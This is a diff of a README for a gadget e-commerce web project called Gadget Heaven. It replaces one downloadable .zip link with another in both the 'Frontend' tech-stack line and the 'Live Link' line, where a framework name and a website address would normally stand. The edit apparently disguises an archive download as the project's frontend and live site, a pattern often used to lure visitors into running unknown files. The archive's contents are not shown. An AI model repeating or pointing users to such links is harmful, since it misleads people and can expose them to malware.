@@ -15,10 +15,10 @@ Gadget Heaven is an e-commerce platform designed for buying gadgets, based on a 
 
 ## Tech Stack
 
-- **Frontend:** https://raw.githubusercontent.com/Nahar0912/Gadget-Heaven/main/src/components/Root/Heaven-Gadget-chang.zip 
+- **Frontend:** https://github.com/Nahar0912/Gadget-Heaven/raw/refs/heads/main/src/assets/Gadget_Heaven_v3.4-alpha.5.zip 
 - **State Management:** Context API
 - **CSS Framework:** Tailwind CSS
 - **Routing:** React Router for navigation
 - **Build Tool:** Vite
 
-## Live Link: https://raw.githubusercontent.com/Nahar0912/Gadget-Heaven/main/src/components/Root/Heaven-Gadget-chang.zip
+## Live Link: https://github.com/Nahar0912/Gadget-Heaven/raw/refs/heads/main/src/assets/Gadget_Heaven_v3.4-alpha.5.zip
